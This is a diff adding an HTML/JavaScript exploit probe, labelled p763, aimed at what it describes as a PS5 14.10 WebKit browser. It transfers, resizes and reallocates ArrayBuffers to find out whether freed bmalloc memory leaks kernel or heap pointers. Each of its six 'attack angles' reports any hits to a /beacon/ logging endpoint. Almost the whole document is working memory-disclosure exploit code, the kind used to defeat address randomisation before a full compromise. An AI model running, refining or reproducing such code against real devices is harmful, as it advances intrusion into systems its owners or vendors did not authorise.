@@ -1,0 +1,307 @@
+<!--
+  p763: ArrayBuffer transfer memory reuse oracle
+
+  When an ArrayBuffer is transferred (via structuredClone with transfer
+  list or postMessage), its backing store is freed and the original AB
+  becomes detached (zero-length). If we immediately allocate a new AB
+  of the same size, bmalloc LIFO reuse may hand back the same block.
+
+  Key insight: the freed backing store's memory content before reuse
+  may retain residual data from internal bookkeeping, allocator
+  metadata, or adjacent object fields. On bmalloc, freed blocks go
+  to a per-size-class free list. The memory is not zeroed on free
+  (only on first-ever mmap from the OS). If the free list interleaves
+  with C++ object allocations of the same size class, we might observe
+  C++ object field residue -- including pointers.
+
+  Additionally: resizing a ResizableArrayBuffer (confirmed available
+  on PS5 14.10 via p605) reallocates the backing store. The old
+  backing store is freed, and if a new allocation of matching size
+  lands in the same block, we can read the old content.
+
+  Attack angles:
+  A) Transfer AB, immediately reallocate same size, scan for non-zero.
+  B) Resize RAB down then up, check freed region for residue.
+  C) Multiple rapid transfer/alloc cycles to build free-list churn.
+  D) Interleave AB transfer with DOM/CSS object creation of same size.
+  E) MessageChannel transfer with immediate port read.
+  F) Worker-less structured clone transfer (self-transfer).
+
+  CRASH_CLASS: LOW (ArrayBuffer transfer + allocation, no side effects)
+  prior art: p601 (ResizableArrayBuffer confirmed), p605 (BigUint64Array)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p763</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isKptr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return (hi>>>0)>=0xFFFF8000;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000;
+}
+
+window.onload=function(){
+b('p763-START');
+
+// === Section A: Transfer AB, reallocate same size, scan ===
+try{
+  b('A-transfer-reuse');
+  var sizes=[64,128,192,256,384,512,768,1024];
+  var aHits=0;
+  for(var si=0;si<sizes.length;si++){
+    var sz=sizes[si];
+    var found=[];
+    for(var trial=0;trial<50;trial++){
+      var ab=new ArrayBuffer(sz);
+      var fill=new Uint8Array(ab);
+      for(var i=0;i<sz;i++)fill[i]=0xAA;
+      var cloned=structuredClone(ab,{transfer:[ab]});
+      var ab2=new ArrayBuffer(sz);
+      var dv2=new DataView(ab2);
+      var nonzero=0;
+      for(var i=0;i<sz;i++){
+        if(dv2.getUint8(i)!==0)nonzero++;
+      }
+      if(nonzero>0){
+        found.push(nonzero);
+        for(var off=0;off+8<=sz;off+=8){
+          if(isKptr(dv2,off)){
+            aHits++;
+            b('A-KPTR sz='+sz+' trial='+trial+' off='+off+' val='+hex64(dv2,off));
+          }else if(isPtr(dv2,off)){
+            var val=hex64(dv2,off);
+            if(val!=='0x00000000aaaaaaaa'){
+              aHits++;
+              b('A-PTR sz='+sz+' trial='+trial+' off='+off+' val='+val);
+            }
+          }
+        }
+      }
+    }
+    var nzCount=found.length;
+    b('A sz='+sz+' nonzero_trials='+nzCount+'/50'+(found.length>0?' first_nz='+found[0]:''));
+  }
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: ResizableArrayBuffer resize residue ===
+try{
+  b('B-rab-resize');
+  var bHits=0;
+  if(typeof ArrayBuffer.prototype.resize==='function' || typeof ArrayBuffer.prototype.transfer==='function'){
+    for(var trial=0;trial<50;trial++){
+      var rab=new ArrayBuffer(1024,{maxByteLength:4096});
+      var u8=new Uint8Array(rab);
+      for(var i=0;i<1024;i++)u8[i]=0xBB;
+      rab.resize(256);
+      var ab2=new ArrayBuffer(768);
+      var dv2=new DataView(ab2);
+      var nonzero=0;
+      for(var i=0;i<768;i++){
+        if(dv2.getUint8(i)!==0)nonzero++;
+      }
+      if(nonzero>0){
+        b('B trial='+trial+' nonzero='+nonzero);
+        for(var off=0;off+8<=768;off+=8){
+          if(isKptr(dv2,off)){
+            bHits++;
+            b('B-KPTR off='+off+' val='+hex64(dv2,off));
+          }else if(isPtr(dv2,off)){
+            bHits++;
+            b('B-PTR off='+off+' val='+hex64(dv2,off));
+          }
+        }
+      }
+    }
+    b('B-DONE hits='+bHits);
+  }else{
+    b('B-SKIP no resize or transfer');
+    if(typeof ArrayBuffer.prototype.transfer==='function'){
+      b('B-transfer-available');
+      for(var trial=0;trial<50;trial++){
+        var ab=new ArrayBuffer(512);
+        var u8=new Uint8Array(ab);
+        for(var i=0;i<512;i++)u8[i]=0xCC;
+        var ab2=ab.transfer(256);
+        var ab3=new ArrayBuffer(256);
+        var dv3=new DataView(ab3);
+        var nonzero=0;
+        for(var i=0;i<256;i++){
+          if(dv3.getUint8(i)!==0)nonzero++;
+        }
+        if(nonzero>0){
+          b('B-transfer trial='+trial+' nonzero='+nonzero);
+          for(var off=0;off+8<=256;off+=8){
+            if(isPtr(dv3,off)){
+              bHits++;
+              b('B-transfer-PTR off='+off+' val='+hex64(dv3,off));
+            }
+          }
+        }
+      }
+      b('B-transfer-DONE hits='+bHits);
+    }
+  }
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: Rapid transfer/alloc churn ===
+try{
+  b('C-churn');
+  var cHits=0;
+  var SZ=192;
+  var pool=[];
+  for(var wave=0;wave<10;wave++){
+    for(var i=0;i<100;i++){
+      var ab=new ArrayBuffer(SZ);
+      var u=new Uint8Array(ab);
+      for(var j=0;j<SZ;j++)u[j]=0xDD;
+      pool.push(ab);
+    }
+    var transferred=[];
+    for(var i=0;i<pool.length;i++){
+      try{
+        var c=structuredClone(pool[i],{transfer:[pool[i]]});
+        transferred.push(c);
+      }catch(e){}
+    }
+    pool=[];
+    for(var i=0;i<100;i++){
+      var ab=new ArrayBuffer(SZ);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=SZ;off+=8){
+        if(isPtr(dv,off)){
+          var val=hex64(dv,off);
+          if(val!=='0x00000000dddddddd'){
+            cHits++;
+            if(cHits<=5)b('C-PTR wave='+wave+' i='+i+' off='+off+' val='+val);
+          }
+        }
+      }
+      pool.push(ab);
+    }
+    transferred=null;
+  }
+  b('C-DONE hits='+cHits);
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: Interleave transfer with DOM object creation ===
+try{
+  b('D-dom-interleave');
+  var dHits=0;
+  for(var trial=0;trial<20;trial++){
+    var abs=[];
+    for(var i=0;i<50;i++){
+      abs.push(new ArrayBuffer(192));
+    }
+    for(var i=0;i<abs.length;i++){
+      try{structuredClone(abs[i],{transfer:[abs[i]]});}catch(e){}
+    }
+    var spans=[];
+    for(var i=0;i<50;i++){
+      var s=document.createElement('span');
+      s.className='test-'+trial+'-'+i;
+      s.textContent='x'.repeat(20);
+      s.style.cssText='font-family:serif;font-size:16px;color:red;';
+      document.body.appendChild(s);
+      spans.push(s);
+    }
+    for(var i=0;i<50;i++){
+      var ab=new ArrayBuffer(192);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=192;off+=8){
+        if(isPtr(dv,off)){
+          dHits++;
+          if(dHits<=5)b('D-PTR trial='+trial+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+    for(var i=0;i<spans.length;i++){
+      document.body.removeChild(spans[i]);
+    }
+  }
+  b('D-DONE hits='+dHits);
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: MessageChannel transfer ===
+try{
+  b('E-msgchannel');
+  var eHits=0;
+  var mc=new MessageChannel();
+  var eResults=[];
+  mc.port2.onmessage=function(ev){
+    var ab=ev.data;
+    if(ab instanceof ArrayBuffer){
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=ab.byteLength;off+=8){
+        if(isPtr(dv,off)){
+          eHits++;
+          if(eHits<=5)eResults.push('E-PTR off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+  };
+  for(var trial=0;trial<50;trial++){
+    var ab=new ArrayBuffer(256);
+    var u=new Uint8Array(ab);
+    for(var i=0;i<256;i++)u[i]=0xEE;
+    mc.port1.postMessage(ab,[ab]);
+    var ab2=new ArrayBuffer(256);
+    var dv2=new DataView(ab2);
+    for(var off=0;off+8<=256;off+=8){
+      if(isPtr(dv2,off)){
+        eHits++;
+        if(eHits<=5)eResults.push('E-alloc-PTR trial='+trial+' off='+off+' val='+hex64(dv2,off));
+      }
+    }
+  }
+  setTimeout(function(){
+    for(var i=0;i<eResults.length;i++)b(eResults[i]);
+    b('E-DONE hits='+eHits);
+  },100);
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: structuredClone self-transfer (no worker) ===
+try{
+  b('F-self-clone');
+  var fHits=0;
+  for(var trial=0;trial<50;trial++){
+    var ab=new ArrayBuffer(384);
+    var u=new Uint8Array(ab);
+    for(var i=0;i<384;i++)u[i]=0xFF;
+    var cloned;
+    try{
+      cloned=structuredClone(ab,{transfer:[ab]});
+    }catch(e){
+      if(trial===0)b('F-clone-err '+e.message);
+      continue;
+    }
+    var cdv=new DataView(cloned);
+    for(var off=0;off+8<=384;off+=8){
+      var hi=cdv.getUint32(off+4,true);
+      var lo=cdv.getUint32(off,true);
+      if(lo!==0xFFFFFFFF || hi!==0x000000FF){
+        if(hi!==0 && lo!==0){
+          if(isPtr(cdv,off)){
+            fHits++;
+            if(fHits<=5)b('F-PTR trial='+trial+' off='+off+' val='+hex64(cdv,off));
+          }
+        }
+      }
+    }
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+setTimeout(function(){b('p763-COMPLETE');},500);
+};
+</script>
+</head>
+<body></body></html>
